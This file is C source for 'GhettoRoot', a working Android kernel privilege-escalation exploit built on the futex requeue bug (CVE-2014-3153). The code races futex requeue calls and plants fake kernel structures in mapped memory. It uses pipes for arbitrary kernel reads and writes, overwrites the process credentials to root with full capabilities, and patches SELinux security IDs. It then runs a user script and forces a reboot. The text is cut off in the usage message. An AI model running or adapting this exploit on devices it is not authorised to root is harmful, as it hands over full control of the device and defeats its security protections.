/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 *  This file is part of GhettoRoot.                                       *
 *                                                                         *
 *  GhettoRoot is free software: you can redistribute it and/or modify     *
 *  it under the terms of the GNU General Public License as published by   *
 *  the Free Software Foundation, either version 3 of the License, or      *
 *  (at your option) any later version.                                    *
 *                                                                         *
 *  GhettoRoot is distributed in the hope that it will be useful,          *
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of         *
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          *
 *  GNU General Public License for more details.                           *
 *                                                                         *
 *  You should have received a copy of the GNU General Public License      *
 *  along with GhettoRoot.  If not, see <http://www.gnu.org/licenses/>.    *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 *
 *  This code, originally obtained unlicensed from fi01's GitHub, is being
 *  re-distributed under the GPLv3.
 *
 *  Original source code available here:
 *    https://gist.github.com/fi01/a838dea63323c7c003cd
 *
 *  Additional helpful documents:
 *    getroot.c from timwr's Github:
 *      https://github.com/timwr/CVE-2014-3153/blob/master/getroot.c
 *    LKML: Thomas Gleixner: Re: futex(2) man page update help request:
 *      https://lkml.org/lkml/2014/5/15/356
 *    Exploiting the Futex Bug and uncovering Towelroot: 
 *      http://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/
 *
 */
//Android.mk にて、「LOCAL_CFLAGS := -fno-stack-protector -mno-thumb -O0」を指定すること。

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <sys/resource.h>
#include <string.h>
#include <fcntl.h>
#include <time.h>
#include <unistd.h>
#include <sys/stat.h>
#include <getopt.h>
#include <sys/wait.h>

#define FUTEX_WAIT_REQUEUE_PI   11
#define FUTEX_CMP_REQUEUE_PI    12

#define ARRAY_SIZE(a)    (sizeof (a) / sizeof (*(a)))

#define KERNEL_START    0xc0000000

#define LOCAL_PORT    5551

// You can try increasing this if you do not get "Supposedly found cred..."
#define TASKBUF_SIZE  0x100

#define TMPDIR "/data/local/tmp/ghetto"

#define TOKENPASTE(x, y) x ## y
#define TOKENPASTE2(x, y) TOKENPASTE(x, y)
#define UNIQINT TOKENPASTE2(uniqint_, __LINE__)

// debug functions
#define clean_errno() (errno == 0 ? "None" : strerror(errno))
#define log_debug(M, ...) if (verbose) fprintf(stderr, "[DEBUG] %s:%d: " M "\n", __FUNCTION__, __LINE__, ##__VA_ARGS__)
#define log_err(M, ...) if(errno==0) fprintf(stderr, "[ERROR] %s:%d: " M "\n", __FUNCTION__, __LINE__, ##__VA_ARGS__); \
                        else fprintf(stderr, "[ERROR] %s:%d:errno%d:%s: " M "\n", __FUNCTION__, __LINE__, errno, clean_errno(), ##__VA_ARGS__)
#define log_warn(M, ...) if(errno==0) fprintf(stderr, "[WARN] %s:%d: " M "\n", __FUNCTION__, __LINE__, ##__VA_ARGS__); \
                        else fprintf(stderr, "[WARN] %s:%d:errno%d:%s: " M "\n", __FUNCTION__, __LINE__, errno, clean_errno(), ##__VA_ARGS__)
#define log_info(M, ...) fprintf(stderr, "[INFO] %s:%d: " M "\n", __FUNCTION__, __LINE__, ##__VA_ARGS__)
#define log_success(M, ...) if(errno==0) log_info(M, ##__VA_ARGS__); else log_err(M " failed", ##__VA_ARGS__)
#define log_success_int(I,M, ...) { int UNIQINT; UNIQINT = I; if (UNIQINT==0) log_info(M " succeeded", ##__VA_ARGS__); else log_err(M " failed: returned %d", ##__VA_ARGS__, UNIQINT); }
#define debug_mark() log_debug("MARK");
#define debug_enter() log_debug("function start");
#define debug_exit() log_debug("function exit");
#define debug_print(M, ...) if (verbose) printf(msg, ##__VA_ARGS__)


struct thread_info;
struct task_struct;
struct cred;
struct kernel_cap_struct;
struct task_security_struct;
struct list_head;

struct thread_info {
  unsigned long flags;
  int preempt_count;
  unsigned long addr_limit;
  struct task_struct *task;

  /* ... */
};

struct kernel_cap_struct {
  unsigned long cap[2];
};

struct cred {
  unsigned long usage;
  uid_t uid;
  gid_t gid;
  uid_t suid;
  gid_t sgid;
  uid_t euid;
  gid_t egid;
  uid_t fsuid;
  gid_t fsgid;
  unsigned long securebits;
  struct kernel_cap_struct cap_inheritable;
  struct kernel_cap_struct cap_permitted;
  struct kernel_cap_struct cap_effective;
  struct kernel_cap_struct cap_bset;
  unsigned char jit_keyring;
  void *thread_keyring;
  void *request_key_auth;
  void *tgcred;
  struct task_security_struct *security;

  /* ... */
};

struct list_head {
  struct list_head *next;
  struct list_head *prev;
};

struct task_security_struct {
  unsigned long osid;
  unsigned long sid;
  unsigned long exec_sid;
  unsigned long create_sid;
  unsigned long keycreate_sid;
  unsigned long sockcreate_sid;
};


struct task_struct_partial {
  struct list_head cpu_timers[3]; 
  struct cred *real_cred;
  struct cred *cred;
  struct cred *replacement_session_keyring;
  char comm[16];
};

struct mmsghdr {
  struct msghdr msg_hdr;
  unsigned int  msg_len;
};

struct phonefmt {
  char *version;
  unsigned long method;
  unsigned long align;
  unsigned long limit_offset;
  unsigned long hit_iov;
};

char queued_msgs[0x1400];
char buf1[0x1000];
struct phonefmt default_phone = {"", 0, 1, 0, 4};
struct phonefmt new_samsung = {"Linux version 3.4.0-", 1, 1, 7380, 4};
struct phonefmt phones[] = {{"Linux version 3.4.0-722276", 1, 1, 7380, 4},
                             {"Linux version 3.0.31-", 0, 1, 0, 4}};
struct phonefmt *ph = &default_phone;

//bss
int _swag = 0;
int _swag2 = 0;
struct thread_info *HACKS_final_stack_base = NULL;
pid_t waiter_thread_tid;
pthread_mutex_t done_lock;
pthread_cond_t done;
pthread_mutex_t is_thread_desched_lock;
pthread_cond_t is_thread_desched;
volatile int do_socket_tid_read = 0;
volatile int did_socket_tid_read = 0;
volatile int do_splice_tid_read = 0;
volatile int did_splice_tid_read = 0;
volatile int do_dm_tid_read = 0;
volatile int did_dm_tid_read = 0;
pthread_mutex_t is_thread_awake_lock;
pthread_cond_t is_thread_awake;
int HACKS_fdm = 0;
unsigned long MAGIC = 0;
unsigned long MAGIC_ALT = 0;
pthread_mutex_t *is_kernel_writing;
pid_t last_tid = 0;
char* usercmd = NULL;
char* const* userargv = NULL;
int userargc = 0;
unsigned long exclude_feature = 0;
int tries = 0;
int retries = 2;
int rooted = 0;

int verbose = 1;
int root_flag = 1;

void setaffinity()
{
  pid_t pid = syscall(__NR_getpid);
  int mask=1;
  int syscallres = syscall(__NR_sched_setaffinity, pid, sizeof(mask), &mask);
  if (syscallres)
  {
      printf("Error in the syscall setaffinity: mask=%d=0x%x err=%d=0x%x", mask, mask, errno, errno);
      sleep(2);
      printf("This could be bad, but what the heck... We'll try continuing anyway.");
      sleep(2);
  }
}

int check_kernel_version(void)
{
  char filebuf[0x1000];
  FILE *fp;
  int i;
  char *pdest;
  int ret;
  int kernel_num;
  int foundph = 0;
  int len;

  memset(filebuf, sizeof filebuf, 0);

  fp = fopen("/proc/version", "rb");
  fread(filebuf, 1, sizeof(filebuf) - 1, fp);
  fclose(fp);

  len = sprintf(queued_msgs, "Kernel version: %s", filebuf);

  for (i = 0; i < ARRAY_SIZE(phones); i++) {
    pdest = strstr(filebuf, phones[i].version);
    if (pdest != 0) {
      len += sprintf(queued_msgs + len, "Found matching device: %s\n", phones[i].version);
      memcpy(ph, &phones[i], sizeof(struct phonefmt));
      foundph = 1;
      return 1;
    }
  }

  ret = memcmp(filebuf, new_samsung.version, strlen(new_samsung.version));
  if (ret == 0) {
    pdest = filebuf + strlen(new_samsung.version);
    kernel_num = atoi(pdest);
    len += sprintf(queued_msgs + len, "Kernel number: %d\n", kernel_num);

    if (kernel_num > 951485) {
      len += sprintf(queued_msgs + len, "Device is a 'New Samsung'.\n");
      ph = &new_samsung;
      foundph = 1;
      return 1;
    }
  }

  len += sprintf(queued_msgs + len, "No matching device found. Trying default.\n");
  ph = &default_phone;

  return 0;
}

void prepare_reboot()
{
  sleep(2);
  printf("\n"
    "Your device will reboot in 10 seconds.\n"
    "This is normal. Thanks for waiting.\n"
    "Please make sure all programs are closed to avoid losing data.\n"
    "\n"
    "10 seconds...\n"
    "\n"
  );
  sleep(5);

  printf(
    "5 seconds...\n"
    "\n");
  sleep(5);

  printf("Rebooting...\n");

  system("reboot");
  system("su reboot");
}

ssize_t read_pipe(const void *src, void *dest, size_t count)
{
  int pipefd[2];
  ssize_t len;

  debug_enter();

  pipe(pipefd);

  log_debug("dest:%08lx src:%08lx count:%d", (unsigned long)dest, (unsigned long)src, (int)count);
  len = write(pipefd[1], src, count);

  if (len != count) {
    log_err("FAILED READ @ %p : %d", src, (int)len);
    return -1;
  }

  read(pipefd[0], dest, count);

  close(pipefd[0]);
  close(pipefd[1]);

  debug_exit();
  return len;
}

ssize_t write_pipe(void *dest, const void *src, size_t count)
{
  int pipefd[2];
  ssize_t len;

  log_debug("dest:%08lx src:%08lx count:%d", (unsigned long)dest, (unsigned long)src, (int)count);

  pipe(pipefd);

  write(pipefd[1], src, count);
  len = read(pipefd[0], dest, count);

  if (len != count) {
    log_err("FAILED WRITE @ %p : %d", dest, (int)len);
    //prepare_reboot();
    return -1;
  }

  close(pipefd[0]);
  close(pipefd[1]);

  return len;
}

int run_custom_command(const char* usercmd, char* const* userargv, char* buffer, int len)
{
  char *s;
  char *t;
  char *tmp;
  char *end = buffer + len;
  int l = strlen(usercmd);
  s = buffer;
  strncpy(s, usercmd, l);
  s += l;
  if (s < end) {
    //log_debug("buffer: %s", buffer);
    if (userargv != NULL) {
      while (((tmp = *(userargv++)) != NULL) && (s != end)) {
        t = tmp;
        *s++ = ' ';
        if(s == end) break;
        *s++ = '\'';
        if(s == end) break;
        while ((*t != '\0') && (s != end)) {
          if (*t == '\'') {
            *s++ = *t++;
            if (s == end) break;
            *s++ = '\\';
            if (s == end) break;
            *s++ = '\'';
            if (s == end) break;
            *s++ = '\'';
            continue;
          }
          *s++ = *t++;
        }
        if (s == end) break;
        *s++ = '\'';
      }
    }
  }
  *s = '\0';
  log_info("Going to execute: %s", buffer);
  return system(buffer);
}

static inline void postroot()
{
  char* s;
  int result;
  chdir(TMPDIR);
  setenv("TMPDIR", TMPDIR, 1);
  
  if (usercmd) {
    log_debug("Going to execute custom command.");
    s = buf1;
    *s = '\0';
    if (*usercmd == '.' && *(usercmd+1)=='/') {
      snprintf(buf1, ARRAY_SIZE(buf1), "chmod 0755 %s >/dev/null 2>&1", usercmd);
    }
  } else {
    userargv = NULL;
    s = "chmod 0755 ./root.sh";
  }
  if (*s != '\0') log_success_int(system(s), "%s", s);
  if (usercmd) {
    result = run_custom_command(usercmd, userargv, buf1, ARRAY_SIZE(buf1));
    log_success_int(result, "Executing %s", usercmd);
  } else {
    result = system("./root.sh");
    log_success_int(result, "Executing ./root.sh");
  }
  if (result == 256) log_info("Sometimes it gives 256 but succeeds. You'll have to try it out.");
}

void get_root(int signum)
{
  struct thread_info stackbuf;
  unsigned long taskbuf[TASKBUF_SIZE];
  struct cred *cred;
  struct cred credbuf;
  struct task_security_struct *security;
  struct task_security_struct securitybuf;
  pid_t pid;
  int i;
  int ret;
  FILE *fp;

  log_debug("thread ID: %d", syscall(__NR_gettid));
  pthread_mutex_lock(&is_thread_awake_lock);
  pthread_cond_signal(&is_thread_awake);
  pthread_mutex_unlock(&is_thread_awake_lock);


  if (HACKS_final_stack_base == NULL) {
    static unsigned long new_addr_limit = 0xffffffff;
    char *slavename;
    int pipefd[2];
    char readbuf[0x100];

    log_debug("cpid1 resumed");

    pthread_mutex_lock(is_kernel_writing);

    HACKS_fdm = open("/dev/ptmx", O_RDWR);
    unlockpt(HACKS_fdm);
    slavename = ptsname(HACKS_fdm);

    log_debug("HACKS_fdm = %d [%s]", HACKS_fdm, slavename);

    open(slavename, O_RDWR);

    if (ph->limit_offset != 0) {
      pipe(pipefd);

      do_splice_tid_read = 1;

      while (1) {
        if (did_splice_tid_read != 0) {
          break;
        }
      }

      syscall(__NR_splice, HACKS_fdm, NULL, pipefd[1], NULL, sizeof readbuf, 0);
    }
    else {
      do_splice_tid_read = 1;
      while (1) {
        if (did_splice_tid_read != 0) {
          break;
        }
      }

      read(HACKS_fdm, readbuf, sizeof readbuf);
    }

    log_debug("Writing new addr_limit to thread...");
    if (write_pipe(&HACKS_final_stack_base->addr_limit, &new_addr_limit, sizeof new_addr_limit) == -1) return;

    pthread_mutex_unlock(is_kernel_writing);

    while (1) {
      sleep(10);
    }
  }

  log_debug("cpid3 resumed");

  pthread_mutex_lock(is_kernel_writing);

  if (read_pipe(HACKS_final_stack_base, &stackbuf, sizeof stackbuf) == -1) return;
  log_debug("ti.task=%08lx .flags=%08lx .preempt_count=%u .addr_limit=%08lx",
    (unsigned long)stackbuf.task, stackbuf.flags, stackbuf.preempt_count, (unsigned long)stackbuf.addr_limit);

  if (read_pipe(stackbuf.task, taskbuf, sizeof taskbuf) == -1) return;

  log_info("Address limit successfully extended, seemingly");

  cred = NULL;
  security = NULL;
  pid = 0;

  log_debug("Contents of taskbuf:");
  for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
    struct task_struct_partial *task = (void *)&taskbuf[i];
    if (verbose) fprintf(stderr, "%08lx ", taskbuf[i]);

    if (task->cpu_timers[0].next == task->cpu_timers[0].prev && (unsigned long)task->cpu_timers[0].next > KERNEL_START
     && task->cpu_timers[1].next == task->cpu_timers[1].prev && (unsigned long)task->cpu_timers[1].next > KERNEL_START
     && task->cpu_timers[2].next == task->cpu_timers[2].prev && (unsigned long)task->cpu_timers[2].next > KERNEL_START
     && task->real_cred == task->cred && (unsigned long)task->cred > KERNEL_START) {
      if (verbose) fprintf(stderr, "\n");
      log_info("Supposedly found credential at taskbuf[%d]: %08lx", i, (unsigned long)task->cred);
      cred = task->cred;
      break;
    }
  }
  if (i == ARRAY_SIZE(taskbuf) && verbose) fprintf(stderr, "\n");

  if (read_pipe(cred, &credbuf, sizeof credbuf) == -1) return;

  security = credbuf.security;

  if ((unsigned long)security > KERNEL_START && (unsigned long)security < 0xffff0000) {
    if (read_pipe(security, &securitybuf, sizeof securitybuf) == -1) return;

    if (securitybuf.osid != 0
     && securitybuf.sid != 0
     && securitybuf.exec_sid == 0
     && securitybuf.create_sid == 0
     && securitybuf.keycreate_sid == 0
     && securitybuf.sockcreate_sid == 0) {
      securitybuf.osid = 1;
      securitybuf.sid = 1;

      log_debug("YOU ARE A SCARY DEVICE");

      if (write_pipe(security, &securitybuf, sizeof securitybuf) == -1) return;
    }
  }

  credbuf.uid = 0;
  credbuf.gid = 0;
  credbuf.suid = 0;
  credbuf.sgid = 0;
  credbuf.euid = 0;
  credbuf.egid = 0;
  credbuf.fsuid = 0;
  credbuf.fsgid = 0;

  credbuf.cap_inheritable.cap[0] = 0xffffffff;
  credbuf.cap_inheritable.cap[1] = 0xffffffff;
  credbuf.cap_permitted.cap[0] = 0xffffffff;
  credbuf.cap_permitted.cap[1] = 0xffffffff;
  credbuf.cap_effective.cap[0] = 0xffffffff;
  credbuf.cap_effective.cap[1] = 0xffffffff;
  credbuf.cap_bset.cap[0] = 0xffffffff;
  credbuf.cap_bset.cap[1] = 0xffffffff;

  if (write_pipe(cred, &credbuf, sizeof credbuf) == -1) return;

  pid = syscall(__NR_gettid);

  for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
    static unsigned long write_value = 1;

    if (taskbuf[i] == pid) {
      if (write_pipe(((void *)stackbuf.task) + (i << 2), &write_value, sizeof write_value) == -1) return;

      if (getuid() != 0) {
        log_err("ROOT FAILED");
        //prepare_reboot();
        return;
      }
      else {  //rooted
        break;
      }
    }
  }

  //rooted
  rooted = 1;

  ret = system("/system/bin/touch /dev/rooted");
  if (ret != 0) {
    log_err("touch /dev/rooted: COMMAND FAILED. Root failed, almost certainly. Continuing anyway...");
    sleep(1);
  }

  postroot();

  printf("\n *** Thank you for choosing ghettoroot. Please enjoy your stay.\n");
  prepare_reboot();

  debug_mark();
  pthread_mutex_lock(&done_lock);
  debug_mark();
  pthread_cond_signal(&done);
  debug_mark();
  pthread_mutex_unlock(&done_lock);

  while (1) {
    sleep(10);
  }

  return;
}

void *make_sigaction(void *arg)
{
  int prio;
  struct sigaction act;
  int ret;

  debug_enter();
  prio = (int)arg;
  last_tid = syscall(__NR_gettid);

  pthread_mutex_lock(&is_thread_desched_lock);
  pthread_cond_signal(&is_thread_desched);

  act.sa_handler = get_root;
  act.sa_mask = 0;
  act.sa_flags = 0;
  act.sa_restorer = NULL;
  sigaction(12, &act, NULL);

  setpriority(PRIO_PROCESS, 0, prio);

  pthread_mutex_unlock(&is_thread_desched_lock);

  do_dm_tid_read = 1;

  log_debug("loop while waiting for other thread");
  while (did_dm_tid_read == 0) {
    ;
  }

  ret = syscall(__NR_futex, &_swag2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
  log_debug("futex dm: %d %d", ret, errno);

  log_debug("loop forever");
  while (1) {
    sleep(10);
  }

  debug_exit();
  return NULL;
}

pid_t wake_actionthread(int prio)
{
  pthread_t th4;
  pid_t pid;
  char filename[256];
  FILE *fp;
  char filebuf[0x1000];
  char *pdest;
  int vcscnt, vcscnt2;

  debug_enter();
  do_dm_tid_read = 0;
  did_dm_tid_read = 0;

  pthread_mutex_lock(&is_thread_desched_lock);
  pthread_create(&th4, 0, make_sigaction, (void *)prio);
  pthread_cond_wait(&is_thread_desched, &is_thread_desched_lock);

  pid = last_tid;

  sprintf(filename, "/proc/self/task/%d/status", pid);

  fp = fopen(filename, "rb");
  if (fp == 0) {
    vcscnt = -1;
  }
  else {
    fread(filebuf, 1, sizeof filebuf, fp);
    pdest = strstr(filebuf, "voluntary_ctxt_switches");
    pdest += 0x19;
    vcscnt = atoi(pdest);
    fclose(fp);
  }

  log_debug("loop while waiting for other thread");
  while (do_dm_tid_read == 0) {
    usleep(10);
  }

  did_dm_tid_read = 1;

  while (1) {
    sprintf(filename, "/proc/self/task/%d/status", pid);
    fp = fopen(filename, "rb");
    if (fp == 0) {
      vcscnt2 = -1;
    }
    else {
      fread(filebuf, 1, sizeof filebuf, fp);
      pdest = strstr(filebuf, "voluntary_ctxt_switches");
      pdest += 0x19;
      vcscnt2 = atoi(pdest);
      fclose(fp);
    }

    if (vcscnt2 == vcscnt + 1) {
      break;
    }
    usleep(10);

  }

  log_debug("mutex unlock");
  pthread_mutex_unlock(&is_thread_desched_lock);

  debug_exit();
  return pid;
}

int make_socket(void)
{
  int sockfd;
  struct sockaddr_in addr = {0};
  int ret;
  int sock_buf_size;

  debug_enter();
  sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);
  if (sockfd < 0) {
    log_err("socket failed");
    usleep(10);
  }
  else {
    addr.sin_family = AF_INET;
    addr.sin_port = htons(LOCAL_PORT);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  }

  while (1) {
    ret = connect(sockfd, (struct sockaddr *)&addr, 16);
    if (ret >= 0) {
      break;
    }
    usleep(10);
  }

  sock_buf_size = 1;
  setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, (char *)&sock_buf_size, sizeof(sock_buf_size));

  debug_exit();
  return sockfd;
}

void *send_magicmsg(void *arg)
{
  int sockfd;
  struct mmsghdr msgvec[1];
  struct iovec iov[8];
  unsigned long databuf[0x20];
  int i;
  int ret;

  debug_enter();

  waiter_thread_tid = syscall(__NR_gettid);
  setpriority(PRIO_PROCESS, 0, 12);

  sockfd = make_socket();

  for (i = 0; i < ARRAY_SIZE(databuf); i++) {
    databuf[i] = MAGIC;
  }

  // Not sure if this is entirely correct, but works with ph->align != 0
  // see http://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/
  for (i = 0; i < 8; i++) {
    iov[i].iov_base = (void *)MAGIC;
    if (ph->align == 0) { // this might be wrong.
      if (i==ph->hit_iov) {
        iov[i].iov_len = MAGIC_ALT;
      }
      else {
        iov[i].iov_len = 0x10;
      }
    }
    else { // this seems to be right.
      iov[i].iov_len = MAGIC_ALT;
    }
  }

  msgvec[0].msg_hdr.msg_name = databuf;
  msgvec[0].msg_hdr.msg_namelen = sizeof databuf;
  msgvec[0].msg_hdr.msg_iov = iov;
  msgvec[0].msg_hdr.msg_iovlen = ARRAY_SIZE(iov);
  msgvec[0].msg_hdr.msg_control = databuf;
  msgvec[0].msg_hdr.msg_controllen = ARRAY_SIZE(databuf);
  msgvec[0].msg_hdr.msg_flags = 0;
  msgvec[0].msg_len = 0;

  syscall(__NR_futex, &_swag, FUTEX_WAIT_REQUEUE_PI, 0, 0, &_swag2, 0);

  do_socket_tid_read = 1;

  log_debug("loop while waiting for other thread");
  while (1) {
    if (did_socket_tid_read != 0) {
      break;
    }
  }

  ret = 0;

  log_debug("perform selected method");
  switch (ph->method) {
  case 0:
    while (1) {
      ret = syscall(__NR_sendmmsg, sockfd, msgvec, 1, 0);
      if (ret <= 0) {
        break;
      }
    }

    break;

  case 1:
    ret = syscall(__NR_recvmmsg, sockfd, msgvec, 1, 0, NULL);
    break;

  case 2:
    while (1) {
      ret = sendmsg(sockfd, &(msgvec[0].msg_hdr), 0);
      if (ret <= 0) {
        break;
      }
    }
    break;

  case 3:
    ret = recvmsg(sockfd, &(msgvec[0].msg_hdr), 0);
    break;
  }

  if (ret < 0) {
    log_err("Socket failure with selected root method");
  }
  else log_err("Socket functions returned, unexpectedly");

  log_debug("loop forever");
  while (1) {
    sleep(10);
  }

  debug_exit();
  return NULL;
}

static inline setup_exploit(unsigned long mem)
{
  debug_enter();
  *((unsigned long *)(mem - 0x04)) = 0x81;
  *((unsigned long *)(mem + 0x00)) = mem + 0x20;
  *((unsigned long *)(mem + 0x08)) = mem + 0x28;
  *((unsigned long *)(mem + 0x1c)) = 0x85;
  *((unsigned long *)(mem + 0x24)) = mem;
  *((unsigned long *)(mem + 0x2c)) = mem + 8;
  debug_exit();
}

void *search_goodnum(void *arg)
{
  int ret;
  char filename[256];
  FILE *fp;
  char filebuf[0x1000];
  char *pdest;
  int vcscnt, vcscnt2;
  unsigned long magicval;
  pid_t pid;
  unsigned long goodval, goodval2;
  unsigned long addr, setaddr;
  int i;
  char buf[0x1000];

  debug_enter();
  syscall(__NR_futex, &_swag2, FUTEX_LOCK_PI, 1, 0, NULL, 0);

  log_debug("loop FUTEX_CMP_REQUEUE_PI");
  while (1) {
    ret = syscall(__NR_futex, &_swag, FUTEX_CMP_REQUEUE_PI, 1, 0, &_swag2, _swag);
    if (ret == 1) {
      break;
    }
    usleep(10);
  }

  wake_actionthread(6);
  wake_actionthread(7);

  _swag2 = 0;
  do_socket_tid_read = 0;
  did_socket_tid_read = 0;

  log_debug("single FUTEX_CMP_REQUEUE_PI");
  syscall(__NR_futex, &_swag2, FUTEX_CMP_REQUEUE_PI, 1, 0, &_swag2, _swag2);

  log_debug("loop while waiting for other thread");
  while (1) {
    if (do_socket_tid_read != 0) {
      break;
    }
  }

  sprintf(filename, "/proc/self/task/%d/status", waiter_thread_tid);

  fp = fopen(filename, "rb");
  if (fp == 0) {
    vcscnt = -1;
  }
  else {
    fread(filebuf, 1, sizeof filebuf, fp);
    pdest = strstr(filebuf, "voluntary_ctxt_switches");
    pdest += 0x19;
    vcscnt = atoi(pdest);
    fclose(fp);
  }

  did_socket_tid_read = 1;

  while (1) {
    sprintf(filename, "/proc/self/task/%d/status", waiter_thread_tid);
    fp = fopen(filename, "rb");
    if (fp == 0) {
      vcscnt2 = -1;
    }
    else {
      fread(filebuf, 1, sizeof filebuf, fp);
      pdest = strstr(filebuf, "voluntary_ctxt_switches");
      pdest += 0x19;
      vcscnt2 = atoi(pdest);
      fclose(fp);
    }

    if (vcscnt2 == vcscnt + 1) {
      break;
    }
    usleep(10);
  }

  log_info("starting the dangerous things");

  setup_exploit(MAGIC_ALT);
  setup_exploit(MAGIC);
  log_debug("MAGIC: %08lx", MAGIC);
  log_debug("MAGIC_ALT: %08lx", MAGIC_ALT);

  magicval = *((unsigned long *)MAGIC);
  log_debug("magicval: %08lx", magicval);

  wake_actionthread(11);

  if (*((unsigned long *)MAGIC) == magicval) {
    log_debug("MAGIC = MAGIC_ALT;");
    MAGIC = MAGIC_ALT;
  }

  log_debug("Entering while loop...");
  while (1) {
    is_kernel_writing = (pthread_mutex_t *)malloc(4);
    pthread_mutex_init(is_kernel_writing, NULL);

    setup_exploit(MAGIC);

    pid = wake_actionthread(11);

    goodval = *((unsigned long *)MAGIC) & 0xffffe000;

    log_debug("%p is a good number", (void *)goodval);

    do_splice_tid_read = 0;
    did_splice_tid_read = 0;

    pthread_mutex_lock(&is_thread_awake_lock);

    kill(pid, 12);

    pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
    pthread_mutex_unlock(&is_thread_awake_lock);

    while (1) {
      if (do_splice_tid_read != 0) {
        break;
      }
      usleep(10);
    }

    sprintf(filename, "/proc/self/task/%d/status", pid);
    fp = fopen(filename, "rb");
    if (fp == 0) {
      vcscnt = -1;
    }
    else {
      fread(filebuf, 1, sizeof filebuf, fp);
      pdest = strstr(filebuf, "voluntary_ctxt_switches");
      pdest += 0x19;
      vcscnt = atoi(pdest);
      fclose(fp);
    }

    did_splice_tid_read = 1;

    while (1) {
      sprintf(filename, "/proc/self/task/%d/status", pid);
      fp = fopen(filename, "rb");
      if (fp == 0) {
        vcscnt2 = -1;
      }
      else {
        fread(filebuf, 1, sizeof filebuf, fp);
        pdest = strstr(filebuf, "voluntary_ctxt_switches");
        pdest += 19;
        vcscnt2 = atoi(pdest);
        fclose(fp);
      }

      if (vcscnt2 != vcscnt + 1) {
        break;
      }
      usleep(10);
    }

    goodval2 = 0;
    if (ph->limit_offset != 0) {
      addr = (unsigned long)mmap((unsigned long *)0xbef000, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
      if (addr != 0xbef000) {
        continue;
      }

      setup_exploit(0xbeffe0);

      *((unsigned long *)0xbf0004) = 0xbef000 + ph->limit_offset + 1;

      *((unsigned long *)MAGIC) = 0xbf0000;

      wake_actionthread(10);

      goodval2 = *((unsigned long *)0x00bf0004);

      munmap((unsigned long *)0xbef000, 0x2000);

      goodval2 <<= 8;
      if (goodval2 < KERNEL_START) {

        setaddr = (goodval2 - 0x1000) & 0xfffff000;

        addr = (unsigned long)mmap((unsigned long *)setaddr, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
        if (addr != setaddr) {
          continue;
        }

        setup_exploit(goodval2 - 0x20);
        *((unsigned long *)(goodval2 + 4)) = goodval + ph->limit_offset;
        *((unsigned long *)MAGIC) = goodval2;

        wake_actionthread(10);

        goodval2 = *((unsigned long *)(goodval2 + 4));

        munmap((unsigned long *)setaddr, 0x2000);
      }
    }
    else {
      setup_exploit(MAGIC);
      *((unsigned long *)(MAGIC + 0x24)) = goodval + 8;

      wake_actionthread(12);
      goodval2 = *((unsigned long *)(MAGIC + 0x24));
    }

    log_debug("%p is also a good number", (void *)goodval2);

    for (i = 0; i < 9; i++) {
      setup_exploit(MAGIC);

      pid = wake_actionthread(10);

      if (*((unsigned long *)MAGIC) < goodval2) {
        HACKS_final_stack_base = (void *)(*((unsigned long *)MAGIC) & 0xffffe000);

        pthread_mutex_lock(&is_thread_awake_lock);

        kill(pid, 12);

        pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
        pthread_mutex_unlock(&is_thread_awake_lock);

        log_debug("Writing to HACKS_fdm...");

        write(HACKS_fdm, buf, sizeof buf);

        while (1) {
          sleep(10);
        }
      }

    }
  }

  debug_exit();
  return NULL;
}

void *accept_socket(void *arg)
{
  int sockfd;
  int yes;
  struct sockaddr_in addr = {0};
  int ret;

  debug_enter();
  sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);

  yes = 1;
  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *)&yes, sizeof(yes));

  addr.sin_family = AF_INET;
  addr.sin_port = htons(LOCAL_PORT);
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

  listen(sockfd, 1);

  while(1) {
    ret = accept(sockfd, NULL, NULL);
    if (ret < 0) {
      log_err("**** SOCK_PROC FAILED ****");
      while(1) {
        sleep(10);
      }
    }
    else {
      log_debug("Socket tastefully accepted.");
    }
  }

  debug_exit();
  return NULL;
}

int init_exploit(void)
{
  unsigned long addr;
  pthread_t th1, th2, th3;

  debug_enter();

  pthread_create(&th1, NULL, accept_socket, NULL);

  addr = (unsigned long)mmap((void *)0xa0000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
  addr += 0x800;
  MAGIC = addr;
  if ((long)addr >= 0) {
    log_debug("first mmap failed?");
    while (1) {
      sleep(10);
    }
  }

  addr = (unsigned long)mmap((void *)0x100000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
  addr += 0x800;
  MAGIC_ALT = addr;
  if (addr > 0x110000) {
    log_debug("second mmap failed?");
    while (1) {
      sleep(10);
    }
  }

  pthread_mutex_lock(&done_lock);
  pthread_create(&th2, NULL, search_goodnum, NULL);
  pthread_create(&th3, NULL, send_magicmsg, NULL);
  pthread_cond_wait(&done, &done_lock);

  debug_exit();

  return rooted;
}

static void show_usage()
{
  printf(
  "Usage: ghettoroot [OPTION] [COMMAND]...\n"
  "  All parameters are optional. The first non-number and following arguments\n"
  "  will be interpreted as the user command and user arguments.\n"
  "\n"
